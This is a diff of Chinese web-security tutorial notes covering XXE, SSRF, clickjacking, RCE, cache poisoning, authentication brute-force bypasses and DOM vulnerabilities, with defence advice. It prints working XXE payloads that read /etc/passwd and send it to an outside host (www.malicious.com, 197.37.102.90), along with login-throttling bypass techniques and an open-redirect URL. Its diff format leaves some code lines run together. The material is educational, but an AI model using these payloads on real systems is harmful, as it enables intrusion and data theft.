-<!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
-#将文件内容作为参数发送到黑客服务器
-<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
-]>
-<foo>&callhome;</foo>
-```
-#### 利用XXE进行SSRF攻击？
-利用XXE进行SSRF攻击，可以诱导服务器端应用程序向服务器可以访问的任何 URL 发出 HTTP 请求。
-
-要利用 XXE 漏洞执行SSRF 攻击，您需要使用要定位的 URL 定义外部 XML 实体，并在数据值中使用定义的实体。如果您可以在应用程序响应中返回的数据值中使用定义的实体，那么您将能够从应用程序响应中的 URL 查看响应，从而获得与后端系统的双向交互。如果没有，那么您将只能执行盲目的 SSRF攻击（这仍然会产生严重的后果）。
-
-在以下 XXE 示例中，外部实体将导致服务器向组织基础架构内的内部系统发出后端 HTTP 请求：
-
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
-### XXE 攻击
-#### 奇淫技巧
-如果网站允许上传 .docx  .xlsx  、 .pptx  文件，其实本质只是个 XML 文件的压缩包。
-创建了一个 .docx (或其他x) 文件，并使用 7zip 打开它来提取内容，并将下面的载荷插入了一个 XML 文件中
-```bash
-<!DOCTYPE root [
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % dtd SYSTEM "http://197.37.102.90/ext.dtd">
-%dtd;
-%send;
-]]>
+# 读取服务器密码## 情况1：有回显<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo （foo取名任意） [<!ELEMENT foo ANY 其他任意实体 ><!ENTITY xxe（变量名） SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>## 情况2：无回显（+远程）<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///etc/passwd" >#将文件内容作为参数发送到黑客服务器<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">]><foo>&callhome;</foo>
 ```
 
-#### 自动攻击工具
-
-XXEinjector的漏洞利用工具，XXEinjector是一款基于Ruby的XXE注入工具，它可以使用多种直接或间接带外方法来检索文件。其中，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。
-工具地址 https://github.com/enjoiz/XXEinjector
-
-#### 手动攻击
-
-**人工嗅探**
-burpsuite爬取后，搜索关键词content-type看对应的值是否有/xml关键字。有的话代表接受XML数据.没有的话看是否能修改成传输XML的格式，即application/xml或text/xml
-
-看传输数据的格式是否接受XML文件 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714133306556.png)
-如下图为一个接受XML文件的传输代表例子：
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714134047639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-**加载payload**
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714134317702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-#### payload
-
-##### 读取文件
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714121854241.png)
-
-##### 内网、ip、文件探测
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714122215349.png)
-
-##### 引入外部实体DTD
-
-通过将关键代码放在dtd里可以使得上传的xml文本免于管理员的检测
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071412303340.png)
-
-##### 无回显读取文件
+无回显补充：
 
 如果目标站点没有回显，就将目标站点的文件直接请求到自己服务器
 注意这里额外多使用了个base64加密是因为这是php文件读取的方法，php读取文件就不必在写全目录了(当然写全也无可厚非，如下图就是写全的)，如果是同级目录下就是test.txt
@@ -3202,32 +3153,16 @@ burpsuite爬取后，搜索关键词content-type看对应的值是否有/xml关�
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714131106544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
-许多网站在数据的字符串和传输中使用 XML，如果不采取对策，那么这些信息将受到损害。可能的各种攻击是：
-inband
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623213839678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+#### 利用XXE进行SSRF攻击？
 
-error
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623213908352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+利用XXE进行SSRF攻击，可以诱导服务器端应用程序向服务器可以访问的任何 URL 发出 HTTP 请求。
 
-oob
-无输出，必须要执行一些带外请求才能吧目标数据提取出来
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623213937334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623214220130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+要利用 XXE 漏洞执行SSRF 攻击，您需要使用要定位的 URL 定义外部 XML 实体，并在数据值中使用定义的实体。如果您可以在应用程序响应中返回的数据值中使用定义的实体，那么您将能够从应用程序响应中的 URL 查看响应，从而获得与后端系统的双向交互。如果没有，那么您将只能执行盲目的 SSRF攻击（这仍然会产生严重的后果）。
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623214853494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+在以下 XXE 示例中，外部实体将导致服务器向组织基础架构内的内部系统发出后端 HTTP 请求：
 
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 
-#### 远程文件 SSRF
-
-这些文件是攻击者注入远程托管的恶意脚本以获得管理员访问权限或关键信息的文件。我们将尝试获取/etc/passwd为此我们将输入以下命令。
-
-```bash
-<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE reset [ <!ENTITY ignite SYSTEM "file:///etc/passwd"> ]><reset><login>&ignite;</ login><secret>有任何错误吗？</secret></reset>
-```
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604120133412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-输入上述命令后，只要我们点击发送按钮，我们就会看到 passwd 文件！！
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604131802628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 #### XXE 亿笑攻击-DOS
 
@@ -3238,16 +3173,107 @@ oob
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604115949948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
-### 防御
+### 寻找 XXE 注入的隐藏攻击面
 
+#### 前端数据没有定义DOCTYPE
+
+一些应用程序接收客户端提交的数据，在服务器端将其嵌入到 XML 文档中，然后解析该文档。当客户端提交的数据被放入后端 SOAP 请求，然后由后端 SOAP 服务处理时，就会发生这种情况。
+
+在这种情况下，您无法执行经典的 XXE 攻击，因为您无法控制整个 XML 文档，因此无法定义或修改DOCTYPE元素。但是，您也许可以XInclude改用。XInclude是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以XInclude在 XML 文档中的任何数据值中放置攻击，因此可以在您只控制放置在服务器端 XML 文档中的单个数据项的情况下执行攻击。
+
+要执行XInclude攻击，您需要引用XInclude命名空间并提供要包含的文件的路径。例如：
+
+```bash
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+#### 允许上传特定文件，无xml在前端回显
+
+一些常见的文件格式使用 XML 或包含 XML 子组件。如下：
+**图像格式**
+指SVG
+SVG包含XML，攻击者可以提交恶意的 SVG 图像，如下将svg编辑为以下内容从而达到 XXE 漏洞的隐藏攻击面。
+
+```bash
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
+
+**文件格式**
+如果网站允许上传 .docx  .xlsx  、 .pptx  文件，其实本质只是个 XML 文件的压缩包。
+创建了一个 .docx (或其他x) 文件以及图像格式（如 ），并使用 7zip 打开它来提取内容，并将下面的载荷插入了一个 XML 文件中
+
+```bash
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://197.37.102.90/ext.dtd">%dtd;%send;]]>
+```
+
+#### 通过修改内容类型进行 XXE 攻击
+
+大多数 POST 请求使用由 HTML 表单生成的默认内容类型，例如application/x-www-form-urlencoded. 一些网站希望接收这种格式的请求，但会容忍其他内容类型，包括 XML。
+
+例如，如果正常请求包含以下内容：
+
+```bash
+POST /action HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 7foo=bar
+```
+
+然后您可以提交以下请求，结果相同：
+
+```bash
+POST /action HTTP/1.0Content-Type: text/xmlContent-Length: 52<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+```
+
+如果应用程序容忍消息正文中包含 XML 的请求，并将正文内容解析为 XML，那么您只需将请求重新格式化为使用 XML 格式即可到达隐藏的 XXE 攻击面。
+
+
+
+### 如何查找和测试 XXE 漏洞
+
+#### 自动化工具
+
+使用 Burp Suite 的Web 漏洞扫描器可以快速可靠地找到绝大多数 XXE 漏洞。
+
+****
+
+XXEinjector的漏洞利用工具，XXEinjector是一款基于Ruby的XXE注入工具，它可以使用多种直接或间接带外方法来检索文件。其中，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。
+工具地址 https://github.com/enjoiz/XXEinjector
+
+
+
+#### 手动测试
+
+手动测试 XXE 漏洞通常涉及：
+
+通过定义基于众所周知的操作系统文件的外部实体并在应用程序响应中返回的数据中使用该实体来 测试文件检索。
+通过根据您控制的系统的 URL 定义外部实体并监视与该系统的交互来 测试盲 XXE 漏洞。
+通过使用XInclude 攻击尝试检索众所周知的操作系统文件，测试服务器端 XML 文档中是否包含用户提供的非 XML 数据的漏洞。
+
+### XXE防御方案
+
+几乎所有 XXE 漏洞的出现都是因为应用程序的 XML 解析库支持应用程序不需要或打算使用的潜在危险的 XML 功能。防止 XXE 攻击的最简单和最有效的方法是禁用这些功能。
+
+通常，禁用外部实体的解析并禁用对XInclude. 这通常可以通过配置选项或以编程方式覆盖默认行为来完成。有关如何禁用不必要的功能的详细信息，请参阅 XML 解析库或 API 的文档。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714142934224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-## RCE（远程命令执行）
+## 点击劫持（Clickjacking）
+
+类似于钓鱼，需要搭建VPS。暂略
+
+### 什么是点击劫持？
+
+点击劫持是一种基于界面的攻击，通过点击诱饵网站中的一些其他内容，诱使用户点击隐藏网站上的可操作内容。请看以下案例：
+网络用户访问诱饵网站（可能这是电子邮件提供的链接）并单击按钮以赢取奖品。不知不觉中，他们被攻击者欺骗，按下了一个替代的隐藏按钮，这导致在另一个网站上支付一个帐户。这是一个点击劫持攻击的例子。
+
+该技术取决于在 iframe 中包含一个不可见的、可操作的网页（或多个页面），其中包含一个按钮或隐藏链接。iframe 覆盖在用户预期的诱饵网页内容之上。
+
+这种攻击与CSRF攻击的不同之处在于，用户需要执行诸如单击按钮之类的操作，而CSRF 攻击则依赖于在用户不知情或不输入的情况下伪造整个请求。
+对 CSRF 攻击的保护通常是通过使用CSRF 令牌来提供的：特定于会话的一次性号码或随机数。CSRF 令牌不会减轻点击劫持攻击，因为目标会话是使用从真实网站加载的内容建立的，并且所有请求都发生在域上。CSRF 令牌被放入请求中并作为正常行为会话的一部分传递给服务器。与普通用户会话相比的不同之处在于该过程发生在隐藏的 iframe 中。
+
+## 远程命令执行（RCE）
+
 在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理，这就可能造成被执行敏感命令，如下：
+
 ```bash
-#  当被执行index.php?page=1;phpinfo()将会产生漏洞
-$var = $_GET['page'];
-eval($var);
+#  当被执行index.php?page=1;phpinfo()将会产生漏洞$var = $_GET['page'];eval($var);
 ```
 
 **白盒测试RCE敏感函数**
@@ -3755,8 +3781,11 @@ sqlmap -u "http://www.xx.com/xxx.asp" --cookie "id=XXX cookie" --level 2 ＼
 cookie注入 后接cookie值
 当网站依靠cookie结果做数据库查询，且不做过多的防护就会存在注入
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705235758892.png)
+
 ## 网页缓存攻击
+
 ### 什么是网页缓存中毒？
+
 首先来看看**什么是网页缓存吧**，网页缓存是为了避免用户在每次发起http请求时向服务器多次请求造成服务器负载大，缓存通常在固定的时间内保存（缓存）对特定请求的响应。如果另一个用户随后发送了一个等效的请求，缓存会直接向用户提供缓存响应的副本，而无需来自后端的任何交互。通过减少它必须处理的重复请求的数量，这大大减轻了服务器的负载。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/045a3be599244ec684c631ecd0e9830f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
 处理。缓存通过比较请求组件的预定义子集（统称为“缓存键”）来识别等效请求。通常，这将包含请求行和Host标头。未包含在缓存键中的请求组件称为“未键控”。
@@ -3764,7 +3793,9 @@ cookie注入 后接cookie值
 如果传入请求的缓存键与前一个请求的键匹配，则缓存认为它们是等效的。因此，它将提供为原始请求生成的缓存响应的副本。这适用于具有匹配缓存键的所有后续请求，直到缓存的响应过期。
 
 至关重要的是，请求的其他组件会被缓存完全忽略。稍后我们将更详细地探讨这种行为的影响。
+
 ### Web 缓存中毒攻击的影响是什么？
+
 Web 缓存中毒的影响在很大程度上取决于两个关键因素：
 
 **攻击者究竟能成功获得什么缓存**
@@ -3772,31 +3803,40 @@ Web 缓存中毒的影响在很大程度上取决于两个关键因素：
 **受影响页面上的流量**
 中毒响应只会提供给在缓存中毒时访问受影响页面的用户。因此，根据页面是否受欢迎，影响可能从不存在到巨大。例如，如果攻击者设法使主要网站主页上的缓存响应中毒，则攻击可能会影响数千名用户，而无需攻击者进行任何后续交互。
 请注意，缓存条目的持续时间不一定会影响 Web 缓存中毒的影响。攻击通常可以以这样一种方式编写，即它无限期地重新毒害缓存。
+
 ### 构建网络缓存中毒攻击
+
 一般来说，构建一个基本的Web缓存中毒攻击包括以下几个步骤：
 
 1. 识别和评估未加密的输入
 2. 从后端服务器引出有害响应
 3. 获取缓存的响应
+
 #### 识别和评估未加密的输入
+
 任何 Web 缓存中毒攻击都依赖于对未加密输入（例如标头）的操作。在决定是否向用户提供缓存响应时，Web 缓存会忽略无键输入。这种行为意味着您可以使用它们来注入您的有效负载并引发“中毒”响应，如果缓存该响应，将向其请求具有匹配缓存键的所有用户提供服务。因此，构建 Web 缓存中毒攻击的第一步是识别服务器支持的未加密输入。
 
 您可以通过向请求添加随机输入并观察它们是否对响应产生影响来手动识别未加密的输入。这可能很明显，例如直接反映响应中的输入，或触发完全不同的响应。然而，有时效果更微妙，需要一些侦探工作才能弄清楚。您可以使用 Burp Comparer 等工具来比较有和没有注入输入的响应，但这仍然需要大量的手动工作。
 
 #####  Param Miner
+
 幸运的是，您可以通过将Param Miner扩展从 BApp 商店添加到 Burp来自动化识别未加密输入的过程。要使用 Param Miner，您只需右键单击要调查的请求，然后单击“Guess headers”。Param Miner 然后在后台运行，从其广泛的内置标头列表发送包含不同输入的请求。如果包含其注入输入之一的请求对响应有影响，Param Miner 将其记录在 Burp 中，如果您使用的是Burp Suite Professional，则在“问题”窗格中，或在扩展程序的“输出”选项卡中（“扩展器”>“扩展”>“ Param Miner”>“输出”
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/bd3f748086784ac29fd73f09c693f71b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
 注意：在实时网站上测试无键输入时，存在无意中导致缓存将生成的响应提供给真实用户的风险。因此，重要的是要确保您的请求都具有唯一的缓存键，以便它们只会提供给您。为此，您可以在每次发出请求时手动向请求行添加缓存破坏者（例如唯一参数）。或者，如果您使用的是 Param Miner，则可以选择为每个请求自动添加缓存破坏器。
 
 ####  从后端服务器引出有害响应
+
 一旦您确定了未加密的输入，下一步就是准确评估网站如何处理它。了解这一点对于成功引发有害反应至关重要。如果输入反映在来自服务器的响应中而没有经过适当的清理，或者用于动态生成其他数据，那么这就是 Web 缓存中毒的潜在入口点。
 
 ####  获取缓存的响应
+
 操纵输入以引起有害响应是成功的一半，但除非您可以使响应被缓存，否则它不会取得太大成果，这有时会很棘手。
 
 响应是否被缓存取决于各种因素，例如文件扩展名、内容类型、路由、状态代码和响应标头。您可能需要花一些时间来简单地处理不同页面上的请求并研究缓存的行为。一旦您弄清楚如何缓存包含您的恶意输入的响应，您就可以准备向潜在受害者提供漏洞利用。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/fb1280dd1e3041b288e7c1e9e2d07b72.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
+
 ####  如何防止网页缓存中毒漏洞
+
 防止 Web 缓存中毒的最终方法显然是完全禁用缓存。虽然对于许多网站来说，这可能不是一个现实的选择，但在其他情况下，它可能是可行的。例如，如果您只使用缓存，因为它在您采用 CDN 时默认开启，那么可能值得评估默认缓存选项是否确实反映了您的需求。
 
 即使您确实需要使用缓存，将其限制为纯静态响应也是有效的，前提是您对分类为“静态”的内容足够警惕。例如，确保攻击者无法欺骗后端服务器检索静态资源的恶意版本而不是真正的资源。
@@ -3810,15 +3850,184 @@ Web 缓存中毒的影响在很大程度上取决于两个关键因素：
 如果出于性能原因考虑从缓存键中排除某些内容，请改写请求。
 不接受胖GET请求。请注意，某些第三方技术可能默认允许这样做。
 修补客户端漏洞，即使它们看起来无法利用。由于缓存行为中不可预测的怪癖，其中一些漏洞实际上可能被利用。有人发现一个怪癖（无论是基于缓存还是其他方式）使该漏洞可被利用可能只是时间问题。
+
+## 身份验证漏洞
+
+### 身份验证漏洞是如何产生的？
+
+从广义上讲，身份验证机制中的大多数漏洞都以以下两种方式之一出现：
+
+* 身份验证机制很弱，因为它们无法充分防止暴力攻击。
+* 实现中的逻辑缺陷或糟糕的编码允许攻击者完全绕过身份验证机制。这有时称为“损坏的身份验证”。
+
+在 Web 开发的许多领域，逻辑缺陷只会导致网站出现意外行为，这可能是也可能不是安全问题。然而，由于身份验证对安全性如此重要，有缺陷的身份验证逻辑使网站面临安全问题的可能性明显增加。
+
+### 基于密码登录的漏洞
+
+#### 暴力攻击
+
+##### 暴力破解用户名
+
+如果用户名符合可识别的模式（例如电子邮件地址），则用户名特别容易猜到。例如，在格式中看到业务登录是很常见的firstname.lastname@somecompany.com。然而，即使没有明显的模式，有时甚至使用可预测的用户名创建高特权帐户，例如admin或administrator。
+
+在审核过程中，检查网站是否公开披露了潜在的用户名。例如，您能否在不登录的情况下访问用户配置文件？即使配置文件的实际内容被隐藏，配置文件中使用的名称有时与登录用户名相同。您还应该检查 HTTP 响应以查看是否泄露了任何电子邮件地址。有时，回复包含管理员和 IT 支持等高权限用户的电子邮件地址
+
+##### 暴力破解密码
+
+密码也可以类似地被暴力破解，其难度因密码的强度而异。许多网站采用某种形式的密码策略，迫使用户创建高熵密码，至少从理论上讲，单独使用蛮力更难破解。这通常涉及通过以下方式强制执行密码：
+
+最少字符数
+小写和大写字母的混合
+至少一个特殊字符
+然而，虽然高熵密码很难由计算机单独破解，但我们可以利用人类行为的基本知识来利用用户在不知不觉中引入该系统的漏洞。与使用随机字符组合创建强密码不同，用户通常会使用他们可以记住的密码，并尝试将其撬开以适应密码策略。例如，如果mypassword不允许，用户可以尝试类似Mypassword1!或Myp4$$w0rd替代的方法。
+
+在策略要求用户定期更改密码的情况下，用户只需对其首选密码进行微小的、可预测的更改也很常见。例如，Mypassword1!变成Mypassword1?或Mypassword2!.
+
+了解可能的凭据和可预测的模式意味着暴力攻击通常比简单地迭代每个可能的字符组合更复杂，因此更有效。
+
+##### 用户名枚举
+
+用户名枚举是指攻击者能够观察网站行为的变化，以确定给定的用户名是否有效。
+
+如果一开始通过响应时间枚举出了用户名，将大大降低爆破密码的时间成本，用集束炸弹在实际中耗时间要比狙击手慢N倍
+
+在尝试对登录页面进行暴力破解时，您应该特别注意以下方面的任何差异：
+
+* **状态代码**：在暴力攻击期间，返回的 HTTP 状态代码对于绝大多数猜测可能是相同的，因为大多数猜测都是错误的。如果猜测返回不同的状态代码，这强烈表明用户名是正确的。无论结果如何，网站始终返回相同的状态代码是最佳做法，但并不总是遵循这种做法。
+  ![在这里插入图片描述](https://img-blog.csdnimg.cn/4be0c65df42c4de9988912da296f55d9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
+
+* **错误消息**：有时返回的错误消息会有所不同，具体取决于用户名和密码是否都不正确或仅密码不正确。网站的最佳做法是在这两种情况下使用相同的通用消息，但有时会出现小的打字错误。只要一个字符错位，就会使两条消息不同，即使在呈现的页面上看不到该字符的情况下也是如此。
+  ![在这里插入图片描述](https://img-blog.csdnimg.cn/91619ca902984239a90ce41785794c0e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_18,color_FFFFFF,t_70,g_se,x_16)
+  ![在这里插入图片描述](https://img-blog.csdnimg.cn/fa8fdee921fc4124b087dbca0f089f99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
+
+* **响应时间**：如果大多数请求都以类似的响应时间处理，任何与此不同的请求都表明幕后发生了一些不同的事情。这是猜测的用户名可能是正确的另一个迹象。例如，如果用户名有效，网站可能只检查密码是否正确。这个额外的步骤可能会导致响应时间略有增加。这可能是微妙的，但攻击者可以通过输入一个过长的密码来使这种延迟更加明显，网站需要更长的时间来处理该密码。
+  ![在这里插入图片描述](https://img-blog.csdnimg.cn/fb571c83124345f9b0c0e803d738703a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
+
+### 有缺陷的蛮力保护
+
+* 如果远程用户尝试登录失败次数过多，则锁定他们尝试访问的帐户
+* 如果远程用户的 IP 地址快速连续进行过多的登录尝试，则阻止远程用户的 IP 地址
+  两种方法都提供不同程度的保护，但都不是无懈可击的，尤其是在使用有缺陷的逻辑实施时。
+
+##### IP封锁
+
+例如，如果您登录失败的次数过多，有时您可能会发现您的 IP 被阻止。在某些实现中，如果 IP 所有者成功登录，则失败尝试次数的计数器会重置。这意味着攻击者只需每隔几次尝试登录自己的帐户即可防止达到此限制。
+
+在这种情况下，仅在整个单词列表中定期包含您自己的登录凭据就足以使这种防御几乎毫无用处。
+
+只需要在尝试计数器之间交替出现正确的账户名和密码，如果爆破字典很大这通常需要用一个脚本自动间隔插入账号和密码
+
+##### 账户锁定
+
+网站尝试防止暴力破解的一种方法是在满足某些可疑标准时锁定帐户，通常是一定数量的失败登录尝试。就像正常的登录错误一样，来自服务器的响应表明帐户被锁定也可以帮助攻击者枚举用户名。
+
+加一个空白的有效负载位置。结果应该是这个样子：username=§invalid-username§&password=example§§。
+在“有效负载”选项卡上，将用户名列表添加到第一个有效负载集。对于第二组，选择“Null payloads”类型并选择生成 5 个有效载荷的选项。这将有效地导致每个用户名重复 5 次。开始攻击。
+在结果中，请注意其中一个用户名的响应比使用其他用户名时的响应长。更仔细地研究响应并注意它包含不同的错误消息：You have made too many incorrect login attempts.记下此用户名
+
+##### 用户限速
+
+网站尝试防止暴力攻击的另一种方法是通过用户速率限制。在这种情况下，在短时间内发出过多的登录请求会导致您的 IP 地址被阻止。通常，只能通过以下方式之一解锁 IP：
+
+* 经过一定时间后自动
+* 由管理员手动
+* 成功完成验证码后由用户手动操作
+
+用户速率限制有时比帐户锁定更受欢迎，因为它不太容易发生用户名枚举和拒绝服务攻击。但是，它仍然不是完全安全的。正如我们在早期实验室中看到的一个例子，攻击者可以通过多种方式操纵他们的明显 IP 以绕过该块。
+
+由于该限制基于从用户 IP 地址发送的 HTTP 请求的速率，因此如果您可以计算出如何通过单个请求猜测多个密码，有时也可以绕过此防御。
+以下是每个请求有多个凭证绕过检测的情况。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/9e01e9264c2b4819956e6e6dcc80645b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_19,color_FFFFFF,t_70,g_se,x_16)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/cdaf6178999c45f583659a24c7c6d5d3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
+
+### 多因素身份验证中的漏洞
+
+双因素身份验证显然比单因素身份验证更安全。但是，与任何安全措施一样，它的安全性取决于其实施。实施不佳的双因素身份验证可能会被击败，甚至可以完全绕过，就像单因素身份验证一样。
+
+#### 绕过两步验证
+
+ 有时，两因素身份验证的实施存在缺陷，可以完全绕过它
+如果首先提示用户输入密码，然后在单独的页面上提示输入验证码，则用户在输入验证码之前实际上处于“登录”状态。在这种情况下，值得测试一下，看看在完成第一个身份验证步骤后是否可以直接跳到“仅限登录”页面。有时，您会发现网站在加载页面之前实际上并没有检查您是否完成了第二步。
+
+## 基于 DOM 的漏洞
+
+### 什么是DOM？
+
+文档对象模型 (DOM) 是网页浏览器对页面元素的分层表示。网站可以使用 JavaScript 来操作 DOM 的节点和对象，以及它们的属性。DOM 操作本身不是问题。事实上，它是现代网站工作方式不可或缺的一部分。但是，不安全地处理数据的 JavaScript 可能会引发各种攻击。**当网站包含的 JavaScript 获取攻击者可控制的值（称为源）并将其传递到危险函数（称为接收器）时**，就会出现基于 DOM 的漏洞。
+
+### 污点流漏洞
+
+要利用或缓解这些漏洞，首先熟悉源和接收器之间的污点流的基础知识很重要。
+源
+
+> 源是一个 JavaScript 属性，它接受可能受攻击者控制的数据。源的一个例子是location.search属性，因为它从查询字符串中读取输入，这对于攻击者来说相对容易控制。最终，攻击者可以控制的任何财产都是潜在的来源。这包括引用 URL（由document.referrer字符串公开）、用户的 cookie（由document.cookie字符串公开）和网络消息。
+
+接收器
+
+> 接收器是一种潜在危险的 JavaScript 函数或 DOM 对象，如果将攻击者控制的数据传递给它，可能会导致不良影响。例如，该eval()函数是一个接收器，因为它处理作为 JavaScript 传递给它的参数。HTML 接收器的一个示例是document.body.innerHTML因为它可能允许攻击者注入恶意 HTML 并执行任意 JavaScript。
+>
+> 从根本上说，当网站将数据从源传递到接收器，然后接收器在客户端会话的上下文中以不安全的方式处理数据时，就会出现基于 DOM 的漏洞。
+
+最常见的源是 URL，通常通过location对象访问。攻击者可以构建一个链接，将受害者发送到带有查询字符串和 URL 片段部分的有效负载的易受攻击页面。考虑以下代码：
+
+```bash
+# hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）goto = location.hash.slice(1)if (goto.startsWith('https:')) {  location = goto;}
+```
+
+这很容易受到基于 DOM 的开放重定向的影响，因为location.hash以不安全的方式处理源。如果 URL 包含以 开头的哈希片段https:，则此代码提取location.hash属性的值并将其设置为 的location属性window。攻击者可以通过构建以下 URL 来利用此漏洞：
+
+https://www.innocent-website.com/example#https://www.evil-user.net
+
+当受害者访问此 URL 时，JavaScript 将该location属性的值设置为https://www.evil-user.net，这会自动将受害者重定向到恶意站点。例如，这种行为很容易被利用来构建网络钓鱼攻击。
+常见来源
